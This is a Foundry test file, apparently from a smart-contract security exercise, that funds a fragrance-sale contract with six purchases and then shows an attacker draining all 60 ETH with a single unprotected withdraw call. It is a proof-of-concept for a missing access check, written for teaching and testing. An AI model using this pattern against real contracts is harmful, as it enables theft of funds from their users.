// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {KilianExclusive} from "../../src/7. Access Control-3/KilianExclusive.sol";

contract TestKilianExclusive is Test {
    KilianExclusive kilian;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    uint256 constant FRAGRANCE_PRICE = 10 ether;

    function setUp() public {
        vm.deal(user1, 20 ether);
        vm.deal(user2, 20 ether);
        vm.deal(user3, 20 ether);

        vm.startPrank(deployer);
        kilian = new KilianExclusive();

        // Add THE LIQUORS fragrances
        kilian.addFragrance("Apple Brandy");
        kilian.addFragrance("Angel's Share");
        kilian.addFragrance("Roses on Ice");
        kilian.addFragrance("Lheure Verte");

        // Add THE FRESH fragrances
        kilian.addFragrance("Moonlight in Heaven");
        kilian.addFragrance("Vodka on the Rocks");
        kilian.addFragrance("Flower of Immortality");
        kilian.addFragrance("Bamboo Harmony");

        kilian.flipSaleState();
        vm.stopPrank();

        vm.startPrank(user1);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(1);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(4);
        vm.stopPrank();

        vm.startPrank(user2);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(2);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(3);
        vm.stopPrank();

        vm.startPrank(user3);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(5);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(8);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.prank(attacker);
        kilian.withdraw(attacker);

        // Attacker stole all the ETH from the token sale contract
        assertEq(attacker.balance, FRAGRANCE_PRICE * 6);
    }
}
